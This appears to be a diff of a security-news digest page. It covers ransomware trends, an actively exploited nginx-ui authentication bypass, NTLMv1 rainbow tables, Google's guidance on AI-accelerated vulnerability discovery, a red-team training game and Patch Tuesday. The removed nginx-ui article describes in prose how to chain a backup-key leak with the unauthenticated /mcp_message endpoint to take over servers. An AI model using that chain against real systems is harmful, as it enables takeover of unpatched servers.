-Outlook
-The data from 2025 reveals that the recent surge in German leaks is not an isolated incident, but a return to the high-pressure levels previously observed in 2022 and 2023. This resurgence reflects a more volatile and linguistically diverse European threat landscape going into 2026. The 92% growth in German leaks, tripling the European average for 2025, proves that non-English-speaking nations remain a primary target for global extortion groups.
-The disruption of established brands like LockBit has rebalanced the ecosystem into a crowded field of agile data leak sites, such as SafePay and Qilin. These groups appear to be hitting Germany in lockstep with their global expansion, identifying the Mittelstand and German professional services as high-volume, target-rich environments. As threat actors continue to exploit complex supply chains, smaller organizations will remain critical pivot points for those aiming at the top of the industrial stack.
-Recommendations to assist in addressing the threat posed by ransomware are captured in our white paper,[ Ransomware Protection and Containment Strategies: Practical Guidance for Endpoint Protection, Hardening, and Containment](https://cloud.google.com/blog/topics/threat-intelligence/ransomware-protection-and-containment-strategies).</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
         <div id="art-3" class="article-body">
-            <h2 class="article-title">Actively Exploited nginx-ui Flaw (CVE-2026-33032) Enables Full Nginx Server Takeover</h2>
-            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/04/critical-nginx-ui-vulnerability-cve.html" target="_blank">Original Link</a></p>
-            <div class="content-text">A recently disclosed critical security flaw impacting nginx-ui, an open-source, web-based Nginx management tool, has come under active exploitation in the wild.
-The vulnerability in question is CVE-2026-33032 (CVSS score: 9.8), an authentication bypass vulnerability that enables threat actors to seize control of the Nginx service. It has been codenamed MCPwn by Pluto Security.
-"The nginx-ui [MCP](https://www.praetorian.com/blog/mcp-server-security-the-hidden-ai-attack-surface/) (Model Context Protocol) integration exposes two HTTP endpoints: /mcp and /mcp_message," according to an [advisory](https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-h6c2-x2m2-mwhf) released by nginx-ui maintainers last month. "While /mcp requires both IP whitelisting and authentication (AuthRequired() middleware), the /mcp_message endpoint only applies IP whitelisting -- and the default IP whitelist is empty, which the middleware treats as 'allow all.'"
-"This means any network attacker can invoke all MCP tools without authentication, including restarting nginx, creating/modifying/deleting nginx configuration files, and triggering automatic config reloads - achieving complete nginx service takeover."
-According to [Pluto Security](https://pluto.security/blog/mcp-bug-nginx-security-vulnerability-cvss-9-8/) researcher Yotam Perkal, who identified and reported the flaw, the attack can facilitate a full takeover in seconds via two requests -
-- An HTTP GET request to the /mcp endpoint to establish a session and obtain a session ID.
-- An HTTP POST request to the /mcp_message endpoint using the session ID to invoke any MCP tool sans authentication
-The session establishment step requires authentication, but an attacker can pull it off by exploiting a separate vulnerability in nginx-ui versions prior to 2.3.3 ([CVE-2026-27944](https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-g9w5-qffc-6762), CVSS score: 9.8), which exposes the encryption keys required to decrypt backups without authentication via the "/api/backup" endpoint.
-An unauthenticated attacker could weaponize this issue to download a full system backup and extract sensitive data, including credentials, SSL private keys, and a query parameter called "[node_secret](https://nginxui.com/guide/mcp#authentication)" that's used to authenticate the MCP interface. This "node_secret" value can be passed to the HTTP GET request to receive the session ID, which is then used to issue commands through "/mcp_message" without further authentication.
-In other words, attackers can exploit this vulnerability by sending specially crafted HTTP requests directly to the "/mcp_message" endpoint without any authentication headers or tokens.
-Successful exploitation of the flaw could enable them to invoke MCP tools and modify Nginx configuration files and reload the server. Furthermore, an attacker could exploit this loophole to intercept all traffic and harvest administrator credentials.
-Following responsible disclosure, the vulnerability was addressed in [version 2.3.4](https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.4), released on March 15, 2026. As workarounds, users are advised to add "middleware.AuthRequired()" to the "/mcp_message" endpoint to force authentication. Alternatively, it's advised to change the IP allowlisting default behavior from "allow-all" to "deny-all."
-The disclosure comes as Recorded Future, in a report [published](https://www.recordedfuture.com/blog/march-2026-cve-landscape) this week, listed CVE-2026-33032 as one of the 31 vulnerabilities that have been actively exploited by threat actors in March 2026. There are currently no insights on the exploitation activity associated with the security flaw.
-"When you bolt MCP onto an existing application, the MCP endpoints inherit the application’s full capabilities but not necessarily its security controls. The result is a backdoor that bypasses every authentication mechanism the application was carefully built with," Perkal said.
-Data from Shodan shows that there are about 2,689 exposed instances on the internet, with most of them located in China, the U.S., Indonesia, Germany, and Hong Kong.
-"Given the approximately 2,600 publicly reachable nginx-ui instances our researchers identified, the risk to unpatched deployments is immediate and real," Pluto told The Hacker News. "Organizations running nginx-ui should treat this as an emergency: update to version 2.3.4 immediately, or disable MCP functionality and restrict network access as an interim measure."
-News of CVE-2026-33032 follows the discovery of two security flaws in the Atlassian MCP server ("mcp-atlassian") that could be chained to achieve remote code execution. The flaws – tracked as CVE-2026-27825 (CVSS 9.1) and CVE-2026-27826 (CVSS 8.2) and dubbed MCPwnfluence – enable any attacker on the same local network to run arbitrary code on a vulnerable machine without requiring any authentication.
-"When chaining both vulnerabilities -- we are able to send requests to the MCP from the LAN [local area network], redirect the server to the attacker machine, upload an attachment, and then receive a full unauthenticated RCE from the LAN," Pluto Security [said](https://blog.pluto.security/p/mcpwnfluence-cve-2026-27825-critical).
-[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
+            <h2 class="article-title">Into The Rainbow: Google’s NTLMv1 Rainbow Tables Explained in a Bit Too Much Detail</h2>
+            <p class="source-link">Source: Research & Tradecraft Archives - SpecterOps | <a href="https://specterops.io/blog/2026/04/16/into-the-rainbow-googles-ntlmv1-rainbow-tables-explained-in-a-bit-too-much-detail/" target="_blank">Original Link</a></p>
+            <div class="content-text"><p>TL;DR: Google published a blog post with accompanying rainbow tables targeting the Data Encryption Standard (DES) key space. The tables enable recovery of the NT hash used to generate the ciphertexts in NTLMv1 responses. We’ll dive into the tables, the recovery process, and ideally demystify any lingering questions. Acknowledgements There are many previous works on [&#8230;]</p>
+<p>The post <a href="https://specterops.io/blog/2026/04/16/into-the-rainbow-googles-ntlmv1-rainbow-tables-explained-in-a-bit-too-much-detail/">Into The Rainbow: Google’s NTLMv1 Rainbow Tables Explained in a Bit Too Much Detail</a> appeared first on <a href="https://specterops.io">SpecterOps</a>.</p>
+
+[Full content could not be extracted. Visit source for details.]</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
         <div id="art-4" class="article-body">
+            <h2 class="article-title">Defending Your Enterprise When AI Models Can Find Vulnerabilities Faster Than Ever</h2>
+            <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/defending-enterprise-ai-vulnerabilities/" target="_blank">Original Link</a></p>
+            <div class="content-text">Defending Your Enterprise When AI Models Can Find Vulnerabilities Faster Than Ever
+Francis deSouza
+Google Cloud COO and President, Security Products
+Mandiant and Google Threat Intelligence Group
+⠀
+Introduction
+Advances in AI model-powered exploitation have demonstrated that general-purpose AI models can excel at vulnerability discovery, even without being purpose-built for the task. Eventually, capabilities such as these will be integrated directly into the development cycle, and code will be more difficult to exploit than ever; however, this transition creates a critical window of risk. As we harden existing software with AI, threat actors will use it to discover and exploit novel vulnerabilities.
+Faced with this scenario, defenders have two critical tasks: hardening the software we use as rapidly as possible, and preparing to defend systems that have not yet been hardened.
+As noted in Wiz’s blog post, [Claude Mythos: Preparing for a World Where AI Finds and Exploits Vulnerabilities Faster Than Ever](https://www.wiz.io/blog/claude-mythos), now is the time to strengthen playbooks, reduce exposure, and incorporate AI into security programs. The following blog provides an overview of the evolving attack lifecycle, how threat actors will weaponize these capabilities, and a roadmap for modernizing enterprise defensive strategies.
+Exploits in the Adversary Lifecycle
+Historically, the discovery of novel vulnerabilities and the subsequent development of zero-day exploits required significant time, specialized human expertise, and resources. Today, highly capable AI models are increasingly demonstrating the ability to not only identify vulnerabilities but also help generate functional exploits, lowering the barrier to entry for threat actors. Continued advancements in these capabilities will increasingly make exploit development achievable for threat actors of all skill levels, significantly compressing the attack timeline. GTIG has already observed [threat actors leveraging LLMs for this purpose](https://cloud.google.com/blog/topics/threat-intelligence/distillation-experimentation-integration-ai-adversarial-use) as well as the marketing of this capability within [AI tools and services advertised in underground forums](https://cloud.google.com/blog/topics/threat-intelligence/threat-actor-usage-of-ai-tools).
+A significant shift in the economics of zero-day exploitation will enable mass exploitation campaigns, ransomware and extortion operations, and an increased volume of activity from actors who previously guarded these capabilities and used them sparingly.
+Accelerated exploit deployment is a trend we’ve already been observing among advanced adversaries. In our [2025 Zero-Days in Review](https://cloud.google.com/blog/topics/threat-intelligence/2025-zero-day-review) report, we noted that PRC-nexus espionage operators have become increasingly adept at rapidly developing and distributing exploits among otherwise separate threat groups. This has significantly shrunk the historical gap between public vulnerability disclosure and widespread mass exploitation, a trend we expect to continue.
+This evolving landscape will almost certainly result in meaningful shifts over the coming year:
+Scaling Defenses for Machine-Speed Threats
+We have long anticipated that AI models would become capable of vulnerability discovery—which is why we’ve been using AI tools like [Big Sleep](https://blog.google/innovation-and-ai/technology/safety-security/cybersecurity-updates-summer-2025/), [CodeMender](https://deepmind.google/blog/introducing-codemender-an-ai-agent-for-code-security/), and [OSS-Fuzz to proactively find and fix vulnerabilities over the years](https://bughunters.google.com/open-source-security/oss-fuzz).
+Now as threat actors leverage AI to significantly multiply their offensive output, enterprise defenders cannot rely on human-speed patching protocols to keep up. When organizations are confronted with an AI-enabled surge in vulnerabilities, traditional security tooling and manual triage will fail to keep pace.
+Attempting to absorb this exponential increase in workload using legacy processes will result in severe overload and burnout for security and development teams. The question is no longer just about proactive scanning and adherence to traditional patching SLAs; it is about whether organizations are empowering their workforce with the automation needed to eliminate manual toil. To prepare for this reality, organizations must integrate AI defensively, shifting the role of the security practitioner from manual investigator to strategic coordinator.
+A Modern, AI-Integrated Defensive Roadmap
+In order to modernize the traditional vulnerability roadmap, organizations must incorporate automation and prioritize resilience.
+Organizations are no longer defending against purely human-speed exploitation. AI-enabled adversaries can identify, chain, and weaponize weaknesses faster than traditional vulnerability management programs were designed to respond. A modern roadmap should therefore emphasize [automation, resilience, and continuous validation](https://cloud.google.com/security/consulting/mandiant-cybersecurity-transformation).
+This roadmap is organized in two parts. The first outlines advanced modernization priorities for organizations that are ready to evolve their security programs to achieve defense at AI enabled speeds. The second provides foundational guidance for organizations that are still building core vulnerability management capabilities.
+Advanced Modernization Priorities
+Secure Your Code
+Organizations have historically focused on patching and securing tangible assets like laptops, servers, and network infrastructure. In today’s threat landscape, that same discipline must be applied to source code, code libraries, and the systems used to build and deploy it.
+Code repository platforms should be tightly protected and accessible only through trusted internal networks, managed identities, or other strongly controlled access paths. Organizations should proactively scan for secrets within their codebase that may be weaponized by adversaries and eliminate any practice of storing sensitive credentials in plaintext.
+Similarly, organizations are still accountable for vulnerable code from their supply chains, and they must proactively plan for and defend against attacks through exploitation of compromised code libraries. This creates a conflict with updating versions and repositories immediately against holding onto known and trusted versions.
+Accordingly, security controls should cover build runners, CI/CD pipelines, and other automated execution mechanisms, which are increasingly attractive targets for threat actors. AI-enabled scanning tools can help teams detect critical vulnerabilities faster and uncover groups of weaknesses that may appear minor on their own but could be chained together for exploitation.
+Organizations should leverage frameworks like [Wiz SITF](https://www.wiz.io/blog/sitf-sdlc-threat-framework) to map their SDLC threat model and identify "attack chains" where minor, isolated weaknesses are combined by AI to create a critical breach. Additionally, one-time static or dynamic scanning is no longer sufficient. Organizations should deploy emerging commercial and open-source agentic solutions to review code and mitigate flaws before they can be exploited.
+Move to Automated Security Operations
+Traditional dashboards and static detection rules will struggle under the volume of automated attacks. Security operations need to become more dynamic, with a clear path toward an agentic SOC.
+Legacy models are often reactive and constrained by manual workflows, By deploying specialized AI agents such as Google Cloud’s Triage and Investigation Agent and Gemini in [Google Security Operations](https://cloud.google.com/security/products/security-operations), teams can automate alert triage, analyze suspicious code without manual reverse engineering, correlate signals across multiple tools, and generate response playbooks in real time. This allows analysts to spend less time on repetitive investigation and more time on high-value decisions, helping the SOC respond to AI-enabled attacks at AI speed.
+Reduce Attack Surface
+Organizations should design networks with a zero trust approach and focus first on reducing exposure across internet-facing systems, critical infrastructure, control planes, and trusted service infrastructure.
+Network segmentation and identity-based access controls should be in place so that if an edge device is compromised through a zero-day exploit, the blast radius is limited and easier to contain.
+Maintain Continuous Asset Discovery and Posture Management
+Unidentified assets are a major blindspot for organizations and a critical weakness that AI-enabled threat actors are able to exploit with increasing efficiency. Static spreadsheets and manual asset tracking are no longer a viable and scalable strategy.
+Security teams need a continuously updated, automated inventory covering endpoints, servers, public-facing systems, network infrastructure, AI systems, cloud environments and ephemeral assets like Kubernetes pods. Dynamic asset discovery is critical for reducing blind spots and shadow AI. The more seamlessly known assets can be fed into downstream security tooling, the more accurate and effective frontline detection and response will be.
+Expand Automated Scanning Coverage
+Automated vulnerability scanning should cover every major operating system in use, including Windows, macOS, and Linux, across both endpoints and servers.
+Reduce blind spots and maintain continuous, comprehensive visibility into vulnerabilities. Where possible, that visibility should feed directly into automated remediation pipelines.
+Enhance Network Device Patching and Limit Connectivity
+Organizations need a highly automated, repeatable process for identifying missing firmware and security updates on network devices and for scheduling maintenance efficiently. Network infrastructure has long been a preferred target for sophisticated threat actors, and AI will only accelerate the discovery of weaknesses in these often-overlooked systems.
+Organizations should use perimeter controls to block unnecessary outbound connections from internal network devices. Any attempt by those devices to communicate externally should be investigated to determine whether it is required for normal operations or signals something more concerning. Proactively, organizations should baseline what outbound connections are normal, in order to alert against anomalies.
+Formalize Emergency Remediation SLAs
+AI may help accelerate patching, but emergency response still depends on clear human processes.
+Organizations should define remediation SLAs based on severity, exposure, and asset criticality, and those expectations should be aligned across security, IT, and business stakeholders. When a vulnerability is being actively exploited in the wild, teams need a pre-approved, low-friction process to apply temporary mitigations, such as restricting public access or isolating affected systems, while permanent fixes are validated. Extremely critical business processes should each have secondary systems that can deliver the same objectives with different underlying technology. By having alternatives and fall backs for these processes, organizations give themselves more options to address emergency remediation while minimizing potential business disruption.
+Secure AI Agents and Implement SAIF
+As organizations deploy AI agents, they also create a new attack surface that must be protected.
+Organizations should adopt frameworks such as Google’s Secure AI Framework (SAIF) to guide the secure deployment of AI models and applications. Tools like [Google Cloud Model Armor](https://cloud.google.com/security/products/model-armor) or similar industry solutions can also serve as a protective layer for large language model environments by screening inputs and outputs for prompt injection, jailbreak attempts, and [Google Cloud Sensitive Data Protection](https://cloud.google.com/security/products/sensitive-data-protection) can prevent sensitive data leakage. Locking down connections that AI systems can establish such as MCP, with fine grained IAM roles is critical to prevent from insecure plugin use threats.
+Defensive AI systems cannot become another point of compromise, and they should be secured accordingly.
+Foundational Vulnerability Management Priorities
+Not every organization starts from the same baseline. The priorities above assume a relatively mature security program with established tooling, ownership, and operational capacity. For organizations with limited or inconsistent vulnerability management capabilities, the first step is to build a reliable foundation before pursuing advanced AI-enabled operating models.
+The Current Reality of Vulnerability Management
+Vulnerability management programs vary widely based on the maturity of an organization’s overall security program. In more mature environments, vulnerability management is highly automated: in-scope vulnerabilities are identified, routed to the appropriate IT, infrastructure, or application owners, and automatically validated once remediation is complete.
+In less mature environments, the opposite is often true. Vulnerability management may be inconsistent, narrowly scoped, and focused primarily on the highest-profile zero-days. Tracking may still rely on local spreadsheets, systems may be overlooked, and even trusted service infrastructure assets such as Active Directory domain controllers may remain unpatched.
+Such organizations need to immediately modernize and elevate their vulnerability management programs. Most organizations were already unable to remediate every vulnerability across their technology stack, and the rise of AI-enabled threats worsens that reality, increasing the urgency of building programs that are automated, measurable, tracked, and validated.
+Achieving that outcome is challenging. It requires coordination across the three foundational pillars of any security program: people, process, and technology. A prioritized and phased approach is outlined as follows.
+Foundation Step #1 — Baseline Current State
+Begin with the tools, processes, and coverage already in place. Scan everything currently in scope, identify Critical and High findings, and remediate them according to agreed urgency and service levels. At the same time, establish a process for tracking vulnerabilities that are being actively exploited in the wild, along with the emergency patching actions they may require. This phase should also confirm that system owners have defined maintenance windows and the operational support needed to meet remediation SLAs.
+Foundation Step #2 — Expand System Scanning Coverage
+Broaden vulnerability scanning across all major operating systems in use, including Windows, macOS, and Linux, for both endpoints and servers. Additionally, expand coverage to include other network attached systems, including the network devices themselves.The objective is to reduce blind spots and ensure vulnerability visibility extends across the environment, rather than covering only isolated segments.
+Foundation Step #3 — Confirm Asset Inventory and Ownership
+Maintain a simple, accurate inventory of key asset classes, including endpoints, servers, public-facing systems, network infrastructure, and specialized devices such as medical equipment where applicable. Every asset should have a clearly defined owner responsible for remediation coordination, exception handling, and lifecycle accountability.
+Foundation Step #4 — Establish Standard Program Reporting
+Create a consistent reporting cadence that gives stakeholders a clear view of program health and risk. Reporting should include scanning coverage by asset class, top Critical and High vulnerabilities, public-facing exposure, patch compliance, SLA performance, and documented exceptions or risk acceptances. The goal is to produce reporting that drives decisions, not just dashboards that provide visibility.
+Foundation Step #5 — Prioritize Public-Facing and High-Risk Vulnerabilities
+Identify the attack surface and prioritize vulnerabilities affecting internet-exposed systems, critical infrastructure, and assets that present the highest likelihood of exploitation or business impact. Remediation should be tracked against defined deadlines, with clear escalation paths when timelines are at risk. Where possible, internet-exposed systems should be engineered for automatic patching.
+Foundation Step #6 — Develop a Specialized Process for High-Sensitivity Devices
+For device classes that require additional coordination, such as medical devices, industrial control systems, or other operational technology, create a streamlined process for identifying vulnerabilities, coordinating with vendors or support teams, and applying compensating controls when patching is not feasible. These assets often require a different remediation model than standard IT systems.
+Foundation Step #7 — Formalize Remediation SLAs and Exception Handling
+Define remediation SLAs based on severity, exposure, and asset criticality, and ensure they are understood across security, IT, and business stakeholders. Just as importantly, establish a formal exception process for situations where remediation cannot be completed within the required timeframe. Exceptions should be documented, risk-assessed, approved by the appropriate stakeholders, and reviewed on a recurring basis.
+How Google Can Help
+In today’s cybersecurity landscape, we’re not just defending against human attackers, but also against tactics supercharged by AI tools. To counter these machine-speed threats, Google provides a comprehensive, AI-integrated defensive ecosystem:
+-
+Google Threat Intelligence: To combat the unprecedented volume of AI-generated exploits,
+[Google Threat Intelligence](https://cloud.google.com/security/products/threat-intelligence)enables a proactive 'assume breach' mentality. By fusing Mandiant’s codified frontline adversarial behaviors with Google’s global visibility of the threat landscape, security teams can move beyond static indicators to hunt for the subtle, non-linear behaviors characteristic of novel attacks. As both security noise and true threats escalate, the platform helps organizations better prioritize security resources based on active threats. By cutting through this growing noise to focus on what is truly important, security teams save time, ultimately empowering them to disrupt the adversary’s lifecycle long before they can reach their objective. -
+Mandiant Security Consulting Services:
+[Mandiant AI Security Consulting Solutions](https://cloud.google.com/security/solutions/mandiant-ai-consulting)can help organizations design and operationalize this architecture. This includes helping organizations speed the identification and remediation of vulnerabilities through code reviews, mature their secure software development lifecycles (SSDLCs), and modernize the overall vulnerability management programs to handle the anticipated influx of vulnerabilities with greater efficiency and resilience. -
+Agentic SecOps:
+[Google SecOps](https://cloud.google.com/solutions/security/agentic-soc)provides the foundation for an agentic security operations center. This allows teams to augment workflows with agents, combining dynamic AI with deterministic automation. Users can embed agents like the Triage and Investigation agent directly into workflows to accelerate response times. This agent autonomously investigates alerts, gathers evidence, and provides verdicts with clear explanations. This enables automated decision-making and remediation, freeing analysts to focus on high-priority threats rather than false positives. Orchestrating responses becomes more efficient as friction is reduced. Additionally, customers can build enterprise-ready security agents with remote Model Context Protocol (MCP) server support. -
+Mandiant Threat Defense (MTD): To augment internal teams,
+[Mandiant Threat Defense](https://cloud.google.com/security/products/mandiant-managed-threat-hunting)leverages frontline intelligence and AI-enabled telemetry to proactively hunt for and disrupt advanced, machine-speed threats. -
+Wiz: Organizations can maintain
+[continuous asset discovery and dynamic posture management](https://www.wiz.io/blog/claude-mythos), ensuring they can rapidly identify and reduce their attack surface across complex, multi-cloud environments.Wiz uses AI agents, powered by environmental context, to democratize security, prioritize remediation, and proactively reduce the attack surface. Wiz continuously integrates the latest AI models to streamline vulnerability detection and response, and its Model Context Protocol (MCP) server enables security teams to use Wiz’s deep context and risk analysis in agentic workflows. The foundational strategy of Wiz connects cloud, code, and runtime, and employs three key agents: -
+Shift Right (Red Agent): Scans the entire attack surface with an AI-powered attacker, using contextual information (cloud, workload, code analysis) to discover immediately exploitable risks.
+-
+Shift Left (Green Agent): Helps customers identify root causes (cloud-to-code) and automatically deploy fixes using pre-built Wiz skills, and upcoming integrations with CodeMender to self-heal code bases.
+-
+Detect and respond (Blue Agent): Automates the investigation of AI-enabled attacks at the speed of AI, allowing SOC teams to rapidly triage suspicious behavior and utilize runtime protection tools to detect exploitation.
+-
+Google Cloud Model Armor: To secure the AI agents organizations deploy,
+[Google Cloud Model Armor](https://cloud.google.com/security/products/model-armor)acts as a specialized LLM firewall, proactively screening inputs and outputs to block prompt injections and sensitive data leaks.
+Outlook and Implications
+The cybersecurity community has the opportunity to serve as the voice of reason: the best response is proactive, disciplined preparation, not panic. While access to the publicly known, most capable frontier models is currently restricted to responsible actors, the availability of these technologies to a broader audience is inevitable. For defenders, this signals a surge in vulnerability management demands. The traditional window between a vulnerability’s disclosure and its active exploitation in the wild has already largely vanished; the primary concern now is the sheer number of exploits organizations will have to defend against simultaneously. Furthermore, the traditional concept of severity is shifting. In a landscape where AI agents can chain together multiple low-level vulnerabilities, the practical impact difference between a remote code execution (RCE) flaw and a seemingly benign local-only exploit is rapidly disappearing.
+To build on the foundational steps above, organizations can work with Mandiant to plan, prioritize, and implement an AI-enabled cyber defense strategy. AI gives security teams powerful new ways to understand their environments, automate remediation at scale, and strengthen workforce capabilities. By adopting AI-integrated defenses today, organizations can better prepare for the speed, scale, and sophistication of tomorrow’s adversaries.
+Acknowledgement
+This post wouldn't have been possible without numerous experts across Mandiant and GTIG. We specifically would like to thank Omar ElAhdan, Chris Linklater, Austin Larsen, Jared Semrau, Dan Nutting, John Hultquist, and Kimberly Goody for their contributions to this blog post.</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-5" class="article-body">
+            <h2 class="article-title">Dungeons and Daemons</h2>
+            <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/dungeons-and-daemons" target="_blank">Original Link</a></p>
+            <div class="content-text">Dungeons and Daemons
+Roll for Initiative. Hack the Planet.
+[Dungeons & Daemons](https://dnd.trustedsec.net/) is a cybersecurity RPG that drops you into the boots of a Red Team operator on a live engagement. Your mission: infiltrate a corporate facility, compromise the domain, exfiltrate the target data, and vanish—all before the clock runs out.
+No simulations, no slides, just you, a D20, your backpack, and 30 minutes to prove you belong on the Red Team.
+The Mission
+AcmeCorp thinks their security is airtight, from physical access controls to network monitoring, a hardened Active Directory environment, and an isolated mainframe protecting their most sensitive asset. In this mission, you strategically navigate the environment and play your TTPs to avoid detection and eviction.
+Clone a badge or talk your way past the guard. Plant a rogue device in the server room or social engineer your way to an executive escort. Kerberoast the domain or poison the wire. Every decision burns resources, shifts your detection profile, and reshapes the mission.
+There is no single path—there are dozens, and many of them end badly.
+Choose Your Class
+Pick from four (4) operator archetypes, each with a unique edge.
+Characters:
+- Exploit Mage - System attack specialist, +2 to system rolls, reduced hack cost on system techniques
+- Packet Rogue - Network warfare expert, +2 to network rolls, moves quieter on the wire
+- Social Knight - Human-layer operator, +2 to social rolls, smoother under pressure
+- Intrusion Barbarian - Physical access specialist, +2 to physical rolls, brute-force entry with finesse
+Your class shapes how you play, but the dice decide if you survive.
+Elite TTPs
+Every operator starts with a backpack of single-use exploit Cards: RFID cloners, lockpick shims, burner phones, and a few surprises. Play one at the right moment to bypass a roll, boost your odds, or bail yourself out of a bad situation. Once you burn a card, it’s gone.
+Hack the Roll
+Skill checks run on a D20, but this isn’t pure luck. When your roll comes up short, a Buffer Overflow meter kicks in: a moving target on a timing bar where you tap at the right moment to hack your own roll. Nail the green zone for +3. Clip yellow for +1. Miss and you get nothing. It’s part reflex, part nerve, and it can mean the difference between domain admin and game over.
+The Stakes
+Your Stealth bar is your lifeline; if you hit zero, the blue team finds you. Your Hack capacity fuels every technique and slowly regenerates; if you burn it too fast, you’re locked out when it matters most.
+Mini-Games
+Not every challenge is settled by the dice. Scattered throughout the mission are hands-on hacking mini-games, skill-based encounters that put your reflexes and pattern recognition to the test.
+- Hash Cracker - Decode password hashes against the clock by matching character patterns before time runs out.
+- Packet Sniffer - Intercept data packets flowing across the wire by tapping at exactly the right moment to capture them.
+- Frogger Evasion - Navigate through a grid of patrolling guards and security cameras to reach your objective undetected.
+Each mini-game appears at key decision points in the story. If you succeed, you advance with a tactical advantage, but if you fail, you'll feel the consequences—lost stealth, burned resources, or a harder path forward.
+Consultant Mindset
+Dungeons & Daemons was built by the team at [TrustedSec](https://trustedsec.com)—real attack paths and real techniques wrapped in a tabletop RPG you can play in your browser whether you’re warming up for an engagement, onboarding new operators, or just looking for something to play at the next conference. Join the [TrustedSec Discord server](https://discord.com/invite/ZTVba6Mf), #dungeons-and-daemons, to chat with other players and stay informed of future updates.</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-6" class="article-body">
             <h2 class="article-title">Patch Tuesday, April 2026 Edition</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/04/patch-tuesday-april-2026-edition/" target="_blank">Original Link</a></p>
             <div class="content-text">Microsoft today pushed software updates to fix a staggering 167 security vulnerabilities in its Windows operating systems and related software, including a SharePoint Server zero-day and a publicly disclosed weakness in Windows Defender dubbed “BlueHammer.” Separately, Google Chrome fixed its fourth zero-day of 2026, and an emergency update for Adobe Reader nixes an actively exploited flaw that can lead to remote code execution.
@@ -214,6 +352,7 @@ Let’s get used to hundreds of patches per cycle. It’s going to get intense.
 In 2026, either you are forced to use this abomination by Corporate, by applications you Jones for, or are a person with possible masochistic inclinations, IMHO…
 So Windows Defender didn’t prevent a bug in its own code?
 Verrry interesting…
+Spoken like…Ruth Buzzi! (-;
 Regarding the browser vulnerabilities, I found it quite amusing that one of Edge’s newest features was something about having it manage your finances and help one make financial decisions (I clicked through it quickly).
 I think if I nailed my tax return to the nearest telephone pole my financial information would be more secure.
 Sadly, this is extremely true.
@@ -224,12 +363,19 @@ Only affected for Microsoft shared software users domestic and enterprise enviro
 As M$ has access to claude mythos, if they used it to scan windows for vulnerabilities, that would explain the high number of patches. If all goes well, the next iteration of windows could be the most debugged ever…
 On the other hand, if NSA secretly has access to a more powerful version of mythos, since it is obeying rubio who’s slavishly obeying tRumpstein, the ensuing cyberwar could be disastrous…
 My guess is that the BlueHammer exploit code was leaked due to developments such as the AI exploit finding so eloquently described in the news a few days ago. I used to be an exploitation researcher, and realized the industry was heading in this direction in 2018-2019. The market in the upper crust is not what it used to be. Retired from it a few years ago. Not the only one. Not sure what any other people with advanced skills are going to do if they decided against doing LLM and AI (not quite the same mindset!). Tried that too.
-Good luck to my colleague, Chaotic Ellipse. Everyone gets disgusted at some point.</div>
+Good luck to my colleague, Chaotic Ellipse. Everyone gets disgusted at some point.
+I’m getting 2026-04 Security Update (KB5083769) (26200.8246) (2)
+Failed to install on 4/16/2026 – 0x80073712
+Which has not been fixed by the advice given when it occurred for the first time in July 2025 and again in Nov 2025.
+Even the Updater diagnostic is failing to execute. Grrr
+Win 11 Home edition
+Asus Zenbook
+Try it on the 18th. Perhaps it will be of age. Hehe.</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-5" class="article-body">
+        <div id="art-7" class="article-body">
             <h2 class="article-title">CISA Adds Two Known Exploited Vulnerabilities to Catalog</h2>
             <p class="source-link">Source: All CISA Advisories | <a href="https://www.cisa.gov/news-events/alerts/2026/04/14/cisa-adds-two-known-exploited-vulnerabilities-catalog" target="_blank">Original Link</a></p>
             <div class="content-text">CISA Adds Two Known Exploited Vulnerabilities to Catalog
@@ -243,7 +389,7 @@ This product is provided subject to this [Notification](/notification) and this 
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-6" class="article-body">
+        <div id="art-8" class="article-body">
             <h2 class="article-title">CISA Adds 6 Known Exploited Flaws in Fortinet, Microsoft, and Adobe Software</h2>
             <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/04/cisa-adds-6-known-exploited-flaws-in.html" target="_blank">Original Link</a></p>
             <div class="content-text">The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Monday [added](https://www.cisa.gov/news-events/alerts/2026/04/13/cisa-adds-seven-known-exploited-vulnerabilities-catalog) half a dozen security flaws to its Known Exploited Vulnerabilities ([KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)) catalog, citing evidence of active exploitation.
@@ -257,241 +403,7 @@ There are currently no public reports referencing the exploitation of the remain
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-7" class="article-body">
-            <h2 class="article-title">Building a Detection Foundation: Part 5 - Correlation in Practice</h2>
-            <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/building-a-detection-foundation-part-5-correlation-in-practice" target="_blank">Original Link</a></p>
-            <div class="content-text">Building a Detection Foundation: Part 5 - Correlation in Practice
-Table of contents
-From Data Sources to Detection
-We've covered a lot of ground in this series: Windows Security events for logon tracking and process execution; PowerShell logging for script visibility; Sysmon for network connections; registry changes; and everything native logging misses.
-But having logs isn't the same as using them effectively. In this final part, I want to walk through how these data sources work together—in detection engineering and Incident Response.
-As can be gleaned from the previous posts in this series, to get the most out of the logs, a SIEM solution where logs are shipped to is a must. Local logs have proven invaluable, but they are at the mercy of the attacker.
-The Correlation Model
